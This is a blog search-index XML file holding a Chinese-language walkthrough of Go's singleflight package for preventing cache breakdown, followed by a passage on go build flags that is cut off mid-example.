<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Golang-sync-SingleFlight</title>
      <link href="/Code/Code-Golang-SingleFlight/"/>
      <url>/Code/Code-Golang-SingleFlight/</url>
      
        <content type="html"><![CDATA[<div class="note info no-icon">      <a class="no-line-link" href="../../scode">本文分类《源码计划》</a></div><h2 id="缓存击穿"><a href="#缓存击穿" class="headerlink" title="缓存击穿"></a>缓存击穿</h2><p>  高并发场景下，为降低数据库压力，通常通过localcache、redis等设置缓存。接到请求后先从缓存读，如果存在则直接返回，否则需要从数据库读取，然后写到缓存。</p><p>  通常查询数据库在整个请求流程中的耗时是最长的，高并发情况下，可能存在某个请求触发了读数据库的操作但没有返回和写入缓存，在这个期间后续的请求也触发相同的读请求，导致数据库瞬间请求量暴增或者直接被打死。</p><p>  分布式锁可以解决这个问题，即第一个触发的请求加锁，等到写入缓存后释放锁。其他的请求只需要在发现有锁后等待并读取缓存数据即可。golang提供了更轻量的解决方法——singleFlight</p><h2 id="SingleFlight"><a href="#SingleFlight" class="headerlink" title="SingleFlight"></a>SingleFlight</h2><figure class="highlight go"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">"errors"</span></span><br><span class="line"><span class="string">"fmt"</span></span><br><span class="line"><span class="string">"log"</span></span><br><span class="line"><span class="string">"strconv"</span></span><br><span class="line"><span class="string">"sync"</span></span><br><span class="line"><span class="string">"time"</span></span><br><span class="line"></span><br><span class="line"><span class="string">"golang.org/x/sync/singleflight"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> (</span><br><span class="line">g            singleflight.Group</span><br><span class="line">ErrCacheMiss = errors.New(<span class="string">"cache miss"</span>)</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> {</span><br><span class="line"><span class="keyword">var</span> wg sync.WaitGroup</span><br><span class="line">wg.Add(<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 模拟10个并发</span></span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">10</span>; i++ {</span><br><span class="line"><span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> {</span><br><span class="line"><span class="keyword">defer</span> wg.Done()</span><br><span class="line">data, err := load(<span class="string">"key"</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> {</span><br><span class="line">log.Print(err)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">}</span><br><span class="line">log.Println(data)</span><br><span class="line">}()</span><br><span class="line">}</span><br><span class="line">wg.Wait()</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取数据</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">load</span><span class="params">(key <span class="type">string</span>)</span></span> (<span class="type">string</span>, <span class="type">error</span>) {</span><br><span class="line">data, err := loadFromCache(key)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &amp;&amp; err == ErrCacheMiss {</span><br><span class="line"><span class="comment">// 利用 singleflight 来归并请求</span></span><br><span class="line">v, err, _ := g.Do(key, <span class="function"><span class="keyword">func</span><span class="params">()</span></span> (<span class="keyword">interface</span>{}, <span class="type">error</span>) {</span><br><span class="line">data, err := loadFromDB(key)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> {</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">}</span><br><span class="line">setCache(key, data)</span><br><span class="line"><span class="keyword">return</span> data, <span class="literal">nil</span></span><br><span class="line">})</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> {</span><br><span class="line">log.Println(err)</span><br><span class="line"><span class="keyword">return</span> <span class="string">""</span>, err</span><br><span class="line">}</span><br><span class="line">data = v.(<span class="type">string</span>)</span><br><span class="line">}</span><br><span class="line"><span class="keyword">return</span> data, <span class="literal">nil</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">// getDataFromCache 模拟从cache中获取值 cache miss</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">loadFromCache</span><span class="params">(key <span class="type">string</span>)</span></span> (<span class="type">string</span>, <span class="type">error</span>) {</span><br><span class="line"><span class="keyword">return</span> <span class="string">""</span>, ErrCacheMiss</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">// setCache 写入缓存</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">setCache</span><span class="params">(key, data <span class="type">string</span>)</span></span> {}</span><br><span class="line"></span><br><span class="line"><span class="comment">// getDataFromDB 模拟从数据库中获取值</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">loadFromDB</span><span class="params">(key <span class="type">string</span>)</span></span> (<span class="type">string</span>, <span class="type">error</span>) {</span><br><span class="line">fmt.Println(<span class="string">"query db"</span>)</span><br><span class="line">unix := strconv.Itoa(<span class="type">int</span>(time.Now().UnixNano()))</span><br><span class="line"><span class="keyword">return</span> unix, <span class="literal">nil</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>结果：</p><figure class="highlight go"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">query db</span><br><span class="line"><span class="number">2021</span>/<span class="number">07</span>/<span class="number">17</span> <span class="number">11</span>:<span class="number">04</span>:<span class="number">13</span> <span class="number">1626491053454483100</span></span><br><span class="line"><span class="number">2021</span>/<span class="number">07</span>/<span class="number">17</span> <span class="number">11</span>:<span class="number">04</span>:<span class="number">13</span> <span class="number">1626491053454483100</span></span><br><span class="line"><span class="number">2021</span>/<span class="number">07</span>/<span class="number">17</span> <span class="number">11</span>:<span class="number">04</span>:<span class="number">13</span> <span class="number">1626491053454483100</span></span><br><span class="line"><span class="number">2021</span>/<span class="number">07</span>/<span class="number">17</span> <span class="number">11</span>:<span class="number">04</span>:<span class="number">13</span> <span class="number">1626491053454483100</span></span><br><span class="line"><span class="number">2021</span>/<span class="number">07</span>/<span class="number">17</span> <span class="number">11</span>:<span class="number">04</span>:<span class="number">13</span> <span class="number">1626491053454483100</span></span><br><span class="line"><span class="number">2021</span>/<span class="number">07</span>/<span class="number">17</span> <span class="number">11</span>:<span class="number">04</span>:<span class="number">13</span> <span class="number">1626491053454483100</span></span><br><span class="line"><span class="number">2021</span>/<span class="number">07</span>/<span class="number">17</span> <span class="number">11</span>:<span class="number">04</span>:<span class="number">13</span> <span class="number">1626491053454483100</span></span><br><span class="line"><span class="number">2021</span>/<span class="number">07</span>/<span class="number">17</span> <span class="number">11</span>:<span class="number">04</span>:<span class="number">13</span> <span class="number">1626491053454483100</span></span><br><span class="line"><span class="number">2021</span>/<span class="number">07</span>/<span class="number">17</span> <span class="number">11</span>:<span class="number">04</span>:<span class="number">13</span> <span class="number">1626491053454483100</span></span><br><span class="line"><span class="number">2021</span>/<span class="number">07</span>/<span class="number">17</span> <span class="number">11</span>:<span class="number">04</span>:<span class="number">13</span> <span class="number">1626491053454483100</span></span><br></pre></td></tr></tbody></table></figure><h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><h4 id="Group"><a href="#Group" class="headerlink" title="Group"></a>Group</h4><figure class="highlight go"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> Group <span class="keyword">struct</span> {</span><br><span class="line">mu sync.Mutex       <span class="comment">// protects m</span></span><br><span class="line">m  <span class="keyword">map</span>[<span class="type">string</span>]*call <span class="comment">// lazily initialized，map的key就是唯一标识</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> call <span class="keyword">struct</span> {</span><br><span class="line">wg sync.WaitGroup</span><br><span class="line"><span class="comment">// 函数返回值和err信息</span></span><br><span class="line">val <span class="keyword">interface</span>{}</span><br><span class="line">err <span class="type">error</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 是否调用了 forget 方法</span></span><br><span class="line">forgotten <span class="type">bool</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 记录这个 key 被分享了多少次</span></span><br><span class="line">dups  <span class="type">int</span></span><br><span class="line">chans []<span class="keyword">chan</span>&lt;- Result</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h4 id="Do"><a href="#Do" class="headerlink" title="Do"></a>Do</h4><figure class="highlight go"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(g *Group)</span></span> Do(key <span class="type">string</span>, fn <span class="function"><span class="keyword">func</span><span class="params">()</span></span> (<span class="keyword">interface</span>{}, <span class="type">error</span>)) (v <span class="keyword">interface</span>{}, err <span class="type">error</span>, shared <span class="type">bool</span>) {</span><br><span class="line">g.mu.Lock()</span><br><span class="line"><span class="keyword">if</span> g.m == <span class="literal">nil</span> { <span class="comment">// 懒加载</span></span><br><span class="line">g.m = <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="type">string</span>]*call)</span><br><span class="line">}</span><br><span class="line">    <span class="comment">// 先判断 key 是否已经存在</span></span><br><span class="line"><span class="keyword">if</span> c, ok := g.m[key]; ok { <span class="comment">// 存在则说明有其他请求在同步执行，本次请求只需要等待即可</span></span><br><span class="line">c.dups++</span><br><span class="line">g.mu.Unlock()</span><br><span class="line">c.wg.Wait() <span class="comment">// / 等待最先进来的那个请求执行完成，因为需要完成后才能获取到结果，这里用 wg 来阻塞，避免了手动写一个循环等待的逻辑</span></span><br><span class="line">        <span class="comment">// 这里区分 panic 错误和 runtime 的错误，避免出现死锁，后面可以看到为什么这么做</span></span><br><span class="line"><span class="keyword">if</span> e, ok := c.err.(*panicError); ok {</span><br><span class="line"><span class="built_in">panic</span>(e)</span><br><span class="line">} <span class="keyword">else</span> <span class="keyword">if</span> c.err == errGoexit {</span><br><span class="line">runtime.Goexit()</span><br><span class="line">}</span><br><span class="line">        <span class="comment">// 最后直接从 call 对象中取出数据并返回</span></span><br><span class="line"><span class="keyword">return</span> c.val, c.err, <span class="literal">true</span></span><br><span class="line">}</span><br><span class="line">    <span class="comment">// 如果 key 不存在则会走到这里 new 一个 call 并执行</span></span><br><span class="line">c := <span class="built_in">new</span>(call)</span><br><span class="line">c.wg.Add(<span class="number">1</span>)</span><br><span class="line">g.m[key] = c <span class="comment">// 注意 这里在 Unlock 之前就把 call 写到 m 中了，所以 这部分逻辑只有第一次请求会执行</span></span><br><span class="line">g.mu.Unlock()</span><br><span class="line">    </span><br><span class="line"> <span class="comment">// 然后我们调用 doCall 去执行</span></span><br><span class="line">g.doCall(c, key, fn)</span><br><span class="line"><span class="keyword">return</span> c.val, c.err, c.dups &gt; <span class="number">0</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h4 id="doCall"><a href="#doCall" class="headerlink" title="doCall"></a>doCall</h4><p>defer的使用值得学习</p><figure class="highlight go"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(g *Group)</span></span> doCall(c *call, key <span class="type">string</span>, fn <span class="function"><span class="keyword">func</span><span class="params">()</span></span> (<span class="keyword">interface</span>{}, <span class="type">error</span>)) {</span><br><span class="line">    <span class="comment">// 首先这两个 bool 用于标记是否正常返回或者触发了 recover</span></span><br><span class="line">normalReturn := <span class="literal">false</span></span><br><span class="line">recovered := <span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">defer</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> {</span><br><span class="line"><span class="comment">// 如果既没有正常执行完毕，又没有 recover 那就说明需要直接退出了</span></span><br><span class="line"><span class="keyword">if</span> !normalReturn &amp;&amp; !recovered {</span><br><span class="line">c.err = errGoexit</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">c.wg.Done() <span class="comment">// 这里 done 之后前面的所有 wait 都会返回了</span></span><br><span class="line">g.mu.Lock()</span><br><span class="line"><span class="keyword">defer</span> g.mu.Unlock()</span><br><span class="line">        <span class="comment">// forgotten 默认值就是 false，所以默认就会调用 delete 移除掉 m 中的 key</span></span><br><span class="line"><span class="keyword">if</span> !c.forgotten { <span class="comment">// 然后这里也很巧妙，前面先调用了 done，于是所有等待的请求都返回了，那么这个c也没有用了，所以直接 delete 把这个 key 删掉，让后续的请求能再次触发 doCall，而不是直接从 m 中获取结果返回。</span></span><br><span class="line"><span class="built_in">delete</span>(g.m, key)</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> e, ok := c.err.(*panicError); ok {</span><br><span class="line"><span class="comment">// 如果返回的是 panic 错误，为了避免 channel 死锁，我们需要确保这个 panic 无法被恢复</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(c.chans) &gt; <span class="number">0</span> {</span><br><span class="line"><span class="keyword">go</span> <span class="built_in">panic</span>(e)</span><br><span class="line"><span class="keyword">select</span> {} <span class="comment">// Keep this goroutine around so that it will appear in the crash dump.</span></span><br><span class="line">} <span class="keyword">else</span> {</span><br><span class="line"><span class="built_in">panic</span>(e)</span><br><span class="line">}</span><br><span class="line">} <span class="keyword">else</span> <span class="keyword">if</span> c.err == errGoexit {</span><br><span class="line"><span class="comment">// 如果是exitError就直接退出</span></span><br><span class="line">} <span class="keyword">else</span> {</span><br><span class="line"><span class="comment">// 这里就是正常逻辑了,往 channel 里写入数据</span></span><br><span class="line"><span class="keyword">for</span> _, ch := <span class="keyword">range</span> c.chans {</span><br><span class="line">ch &lt;- Result{c.val, c.err, c.dups &gt; <span class="number">0</span>}</span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line">}()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span><span class="params">()</span></span> { <span class="comment">// 使用匿名函数，保证下面的 defer 能在上一个defer之前执行</span></span><br><span class="line"><span class="keyword">defer</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> {</span><br><span class="line">            <span class="comment">// 如果不是正常退出那肯定是 panic 了</span></span><br><span class="line"><span class="keyword">if</span> !normalReturn {</span><br><span class="line">                 <span class="comment">// 如果 panic 了我们就 recover 掉，然后 new 一个 panic 的错误后面在上层重新 panic</span></span><br><span class="line"><span class="keyword">if</span> r := <span class="built_in">recover</span>(); r != <span class="literal">nil</span> {</span><br><span class="line">c.err = newPanicError(r)</span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line">}()</span><br><span class="line"></span><br><span class="line">c.val, c.err = fn()</span><br><span class="line">        <span class="comment">// 如果我们传入的 fn 正常执行了 normalReturn 肯定会被修改为 true</span></span><br><span class="line">        <span class="comment">// 所以 defer 里可以通过这个标记来判定是否 panic 了</span></span><br><span class="line">normalReturn = <span class="literal">true</span></span><br><span class="line">}()</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 如果 normalReturn 为 false 就表示，我们的 fn panic 了</span></span><br><span class="line">    <span class="comment">// 如果执行到了这一步，也说明我们的 fn  也被 recover 住了，不是直接 runtime exit</span></span><br><span class="line"><span class="keyword">if</span> !normalReturn {</span><br><span class="line">recovered = <span class="literal">true</span></span><br><span class="line">}</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h4 id="DoChan"><a href="#DoChan" class="headerlink" title="DoChan"></a>DoChan</h4><p>和 do 唯一的区别是 <code>go g.doCall(c, key, fn)</code>,但对起了一个 goroutine 来执行，并通过 channel 来返回数据，这样外部可以自定义超时逻辑，防止因为 fn 的阻塞，导致大量请求都被阻塞。</p><figure class="highlight go"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(g *Group)</span></span> DoChan(key <span class="type">string</span>, fn <span class="function"><span class="keyword">func</span><span class="params">()</span></span> (<span class="keyword">interface</span>{}, <span class="type">error</span>)) &lt;-<span class="keyword">chan</span> Result {</span><br><span class="line">ch := <span class="built_in">make</span>(<span class="keyword">chan</span> Result, <span class="number">1</span>)</span><br><span class="line">g.mu.Lock()</span><br><span class="line"><span class="keyword">if</span> g.m == <span class="literal">nil</span> {</span><br><span class="line">g.m = <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="type">string</span>]*call)</span><br><span class="line">}</span><br><span class="line"><span class="keyword">if</span> c, ok := g.m[key]; ok {</span><br><span class="line">c.dups++</span><br><span class="line">c.chans = <span class="built_in">append</span>(c.chans, ch)</span><br><span class="line">g.mu.Unlock()</span><br><span class="line"><span class="keyword">return</span> ch</span><br><span class="line">}</span><br><span class="line">c := &amp;call{chans: []<span class="keyword">chan</span>&lt;- Result{ch}}</span><br><span class="line">c.wg.Add(<span class="number">1</span>)</span><br><span class="line">g.m[key] = c</span><br><span class="line">g.mu.Unlock()</span><br><span class="line"></span><br><span class="line"><span class="keyword">go</span> g.doCall(c, key, fn)</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> ch</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h4 id="Forget"><a href="#Forget" class="headerlink" title="Forget"></a>Forget</h4><p>手动移除某个 key，让后续请求能走 doCall 的逻辑，而不是直接阻塞。</p><figure class="highlight go"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(g *Group)</span></span> Forget(key <span class="type">string</span>) {</span><br><span class="line">g.mu.Lock()</span><br><span class="line"><span class="keyword">if</span> c, ok := g.m[key]; ok {</span><br><span class="line">c.forgotten = <span class="literal">true</span></span><br><span class="line">}</span><br><span class="line"><span class="built_in">delete</span>(g.m, key)</span><br><span class="line">g.mu.Unlock()</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2><h4 id="阻塞"><a href="#阻塞" class="headerlink" title="阻塞"></a>阻塞</h4><p>singleflight 内部使用 waitGroup 来让同一个 key 的除了第一个请求的后续所有请求都阻塞。直到第一个请求执行 fn 返回后，其他请求才会返回。</p><p>这意味着，如果 fn 执行需要很长时间，那么后面的所有请求都会被一直阻塞。</p><p>这时候我们可以<strong>使用 DoChan 结合 ctx + select 做超时控制</strong></p><figure class="highlight go"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">loadChan</span><span class="params">(ctx context.Context,key <span class="type">string</span>)</span></span> (<span class="type">string</span>, <span class="type">error</span>) {</span><br><span class="line">data, err := loadFromCache(key)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &amp;&amp; err == ErrCacheMiss {</span><br><span class="line"><span class="comment">// 使用 DoChan 结合 select 做超时控制</span></span><br><span class="line">result := g.DoChan(key, <span class="function"><span class="keyword">func</span><span class="params">()</span></span> (<span class="keyword">interface</span>{}, <span class="type">error</span>) {</span><br><span class="line">data, err := loadFromDB(key)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> {</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">}</span><br><span class="line">setCache(key, data)</span><br><span class="line"><span class="keyword">return</span> data, <span class="literal">nil</span></span><br><span class="line">})</span><br><span class="line"><span class="keyword">select</span> {</span><br><span class="line"><span class="keyword">case</span> r := &lt;-result:</span><br><span class="line"><span class="keyword">return</span> r.Val.(<span class="type">string</span>), r.Err</span><br><span class="line"><span class="keyword">case</span> &lt;-ctx.Done():</span><br><span class="line"><span class="keyword">return</span> <span class="string">""</span>, ctx.Err()</span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line"><span class="keyword">return</span> data, <span class="literal">nil</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h4 id="手动forget"><a href="#手动forget" class="headerlink" title="手动forget"></a>手动forget</h4><p>比如1秒内有100个请求过来，正常是第一个请求能执行queryDB，后续99个都会阻塞。</p><p>增加这个 Forget 之后，每 100ms 就能有一个请求执行 queryDB，相当于是多了几次尝试的机会，相对的也给DB造成了更大的压力，需要根据具体场景进去<code>取舍</code>。</p><figure class="highlight go"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> {</span><br><span class="line">       time.Sleep(<span class="number">100</span> * time.Millisecond)</span><br><span class="line">       g.Forget(key)</span><br><span class="line">   }()</span><br></pre></td></tr></tbody></table></figure><h2 id="原文"><a href="#原文" class="headerlink" title="原文"></a>原文</h2><p><a href="https://www.lixueduan.com/posts/go/singleflight/">https://www.lixueduan.com/posts/go/singleflight/</a></p>]]></content>
      
      
      <categories>
          
          <category> Code </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Golang </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Golang-编译</title>
      <link href="/%E5%90%8E%E7%AB%AF%E5%BC%80%E5%8F%91/2024-03-18-Golang-%E7%BC%96%E8%AF%91/"/>
      <url>/%E5%90%8E%E7%AB%AF%E5%BC%80%E5%8F%91/2024-03-18-Golang-%E7%BC%96%E8%AF%91/</url>
      
        <content type="html"><![CDATA[<h3 id="常用参数"><a href="#常用参数" class="headerlink" title="常用参数"></a>常用参数</h3><ul><li>-o<ul><li>Output 指定编译输出的名称，代替默认的包名</li></ul></li><li>-i<ul><li>install 已废弃，安装指定的包来完成编译，编译需要的包会自动缓存下来</li></ul></li><li>其他参数都归类为build flags</li></ul><h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><figure class="highlight sh"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">go build [-o 输出名] [-i] [编译标记] [包名]</span><br></pre></td></tr></tbody></table></figure><h3 id="build-flags"><a href="#build-flags" class="headerlink" title="build flags"></a>build flags</h3><p>build flags在build,clean,get,install,list,run,test等命令下都是通用的</p><ul><li><p>-tags ‘tag list’</p><ul><li>构建出带tag的版本</li></ul></li><li><p>-gcflags ‘arg list’</p><ul><li>编译参数go tool compile –help查看所有可用的参数</li><li>-m：打印优化信息</li><li>-N：禁用优化（debug时用到）</li><li>-I：禁止内联优化（debug时用到）</li><li>-c：指定编译是的并发数，默认为1</li><li>-L：错误信息中打印文件全名</li></ul><p>gcflag中的pattern</p><ul><li><p>gcflag传入的方式为： -gcflag=”pattern= args”,其中pattern代表取值分别为 main,all,std,…,用于指定编译参数作用的范围，args则为对应的编译参数</p></li><li><p><code>main</code>：表示main函数所在的顶级包路径</p></li><li><p><code>all</code>：表示GOPATH中的所有包。如果在modules模式下，则表示主模块和他所有的依赖，包括test文件的依赖</p></li><li><p><code>std</code>：表示Go标准库中的所有包</p></li><li><p><code>...</code>：表示是一个通配符，可以匹配任意字符串（包括空字符串）</p><ul><li>net/…表示net模块和它所有子模块</li><li>./…表示当前主模块和所有子模块</li><li>如果 pattern 中包含了 / 和 …，那么就不会匹配 vendor 目录。例如: <code>./...</code> 不会匹配 <code>./vendor</code> 目录。可以使用 <code>./vendor/...</code> 匹配 vendor 目录和它的子模块</li></ul><p>举例：</p><figure class="highlight sh"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">go build -gcflags=<span class="string">"main=-N -l"</span> .</span><br></pre></td></tr></tbody></table></figure></li></ul></li><li><p>-ldflags ‘flag list’</p><ul><li>链接参数go tool link –help查看可用可用的参数</li><li>-X：注入变量，通常用于版本信息的注入</li></ul><p>举例：</p><figure class="highlight go"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">"fmt"</span></span><br><span class="line">    <span class="string">"os"</span></span><br><span class="line">)</span><br><span class="line"><span class="keyword">var</span> (</span><br><span class="line">    gitHash   <span 